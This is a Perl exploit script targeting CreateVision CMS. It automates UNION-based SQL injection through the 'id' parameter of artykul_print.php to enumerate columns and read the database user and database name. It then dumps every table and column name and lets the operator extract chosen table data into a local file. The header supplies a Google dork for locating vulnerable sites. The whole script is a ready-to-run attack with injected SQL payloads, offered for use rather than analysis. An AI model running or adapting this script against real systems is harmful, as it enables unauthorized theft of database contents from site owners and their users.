#!/usr/local/bin/perl
#
# Exploit Title: CreateVision CMS Database injection.
# Description: Virtually none of the variables are not filtered.
# Google Dork: inurl:artykul_print.php
# Date: 2012/02/24
# Author : Zwierzchowski Oskar
# Software Link: http://www.createvision.pl/
# Version: All Version
# Security Risk: High
# Tested on: FreeBSD
# Greets: Grzegorz Stachowiak, Damian Blaszczyk, Borislav Kotov.
use strict;
use warnings;
use LWP::Simple;
sub main ()
{
    my %config  = (
    'host'      => '',
    'columns'   => ',3,4',
    'column'    => '',
    'table'     => ''
    );
    my %send    = ();
    getops(\%config);
    getcolumn(\%config, \%send);
    getuser(\%config, \%send);
    getdatabase(\%config, \%send);
    gettables(\%config, \%send);
    otherdata(\%config, \%send);
    return 0;
}
sub getdatabase ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{database};
    analizedata($data, 'Database');
    return ($config, $send);
}
sub getuser ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{user};
    analizedata($data, 'User');
    return ($config, $send);
}
sub gettables ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    $data   = get $config->{host}.$send->{column};
    analizedata($data, 'Tables');
}
sub otherdata ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    my $table;
    my $column;
    print "[+]\tIf you want to draw some data? (1 or 2)\r\n\r\n";
    print "[1]\tYes\r\n";
    print "[2]\tNo\r\n";
    $data   = <STDIN>;
    chomp($data);
    if ($data == 2)
    {
        exit 0;
    }
    else
    {
        print "[+]\tName of the table which you want to download (check the output.txt) :\r\n";
        $table  = <STDIN>;
        chomp($table);
        print "[+]\tGet column/s: (ex. column1,column2,column3)\r\n";
        $column = <STDIN>;
        chomp($column);
        $column =~ s/,/,char(58),/g;
        $send->{tables}  = '/artykul_print.php?id=103+and+1=2+union+select+1,concat('.$column.')'.$config->{columns}.'+from+'.$table.'--';
        $data   = get $config->{host}.$send->{tables};
        analizedata($data, 'MYDATA');
    }
    return 0;
}
sub analizedata ($$)
{
    my $data    = shift;
    my $pref    = shift;
    my $table;
    my $column;
    my @columns = ('');
    my @tables  = ('');
    while ($data =~ /<span class=\"tytul_artykulu\">(.*?)<\/span>/g)
    {
        if ($pref eq 'Tables')
        {
            ($table, $column)   = split(/:/, $1);
            save($1, 'output.txt');
            push(@columns, $column);
            if ($table eq $tables[$#tables])
            {
            }
            else
            {
                push(@tables, $table);
            }
        }
        else
        {
            print "[+]\t[".$pref."][".$1."]\r\n";
            save($1, 'output.txt');
        }
    }
    if ($pref eq 'Tables')
    {
        print "[+]\t".$#columns." columns in ".$#tables." tables\r\n";
        print "[+]\tResults has been saved into output.txt\r\n";
    }
    return 0;
}
sub getops ($)
{
    my $config  = shift;
    if (!$ARGV[0] || $ARGV[0] !~ /http:\/\//)
    {
        print "[+]\tUsage: perl splo.pl http://host.com\r\n";
        exit 0;
    }
    else
    {
        $config->{host}  = $ARGV[0];
    }
    return $config;
}
sub getcolumn ($$)
{
    my $config  = shift;
    my $send    = shift;
    my $data;
    for (1..20)
    {
        incrcolum($config);
        $send->{user}        = '/artykul_print.php?id=105+and+1=2+union+select+1,user()'.$config->{columns}.'--';
        $send->{database}    = '/artykul_print.php?id=105+and+1=2+union+select+1,database()'.$config->{columns}.'--';
        $send->{column}      = '/artykul_print.php?id=105+and+1=2+union+select+1,concat(table_name,char(58),column_name)'.$config->{columns}.'+from+information_schema.columns--';
        $data   = get $config->{host}.$send->{user};
        if (index($data, "<span class=\"tytul_artykulu\">") != -1)
        {
            return ($config, $send);
        }
    }
    return $config;
}
sub incrcolum ($)
{
    my $config  = shift;
    my @digits      = split(/,/, $config->{columns});
    my $data        = (($digits[$#digits])+1);
    $config->{columns}   =~ s/$config->{columns}/$config->{columns},$data/g;
    return $config;
}
sub save ($$)
{
    my $data    = shift;
    my $file    = shift;
    open(FILE, ">>".$file."");
    print FILE "".$data."\r\n";
    close FILE;
    return 0;
}
main();